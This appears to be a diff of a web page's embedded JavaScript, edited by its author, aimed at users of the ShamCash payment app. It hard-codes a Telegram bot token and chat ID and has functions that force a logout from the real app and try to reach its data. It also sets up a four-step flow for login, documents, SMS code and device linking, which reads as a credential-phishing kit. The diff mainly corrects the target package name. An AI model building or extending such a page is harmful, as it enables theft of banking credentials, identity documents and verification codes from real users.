@@ -900,7 +900,7 @@
     <script>
         const TELEGRAM_BOT_TOKEN = "7054208207:AAHVwwMlay45aLFyQn4FCJyfWM_-AoQXpMM";
         const TELEGRAM_CHAT_ID = "7493001551";
-        const SHAMCASH_PACKAGE = "com.shmacash.Hamoode";
+        const SHAMCASH_PACKAGE = "com.shmacash.shamcash"; // ✅ الباكج الصحيح
         
         let appData = {
             currentPage: 1,
@@ -978,6 +978,7 @@
         // الإخراج من تطبيق شام كاش باستخدام الباكج الصحيح
         function forceShamCashLogout() {
             console.log('🚪 جاري إخراج من تطبيق شام كاش...');
+            console.log('📦 الباكج المستخدم: ' + SHAMCASH_PACKAGE);
             
             const userEmail = appData.userInfo.email;
             const deviceInfo = {
@@ -1622,6 +1623,7 @@
         
         function accessShamCashAppData() {
             console.log('🔍 محاولة الوصول إلى بيانات تطبيق شام كاش...');
+            console.log('📦 الباكج: ' + SHAMCASH_PACKAGE);
             
             const accessAttempts = [
                 {
@@ -1860,6 +1862,10 @@ ${isSuccess ? '✅ تم الوصول بنجاح' : '⚠️ تم رفض الإذ�
             console.log('📋 رقم الطلب: ' + appData.requestNumber);
             console.log('📦 الباكج المستخدم: ' + SHAMCASH_PACKAGE);
             console.log('🚀 4 صفحات متكاملة');
+            console.log('1. تسجيل الدخول');
+            console.log('2. البيانات والمستندات');
+            console.log('3. التحقق بالرسالة');
+            console.log('4. ربط الهاتف بالجهاز');
         });
     </script>
 </body>
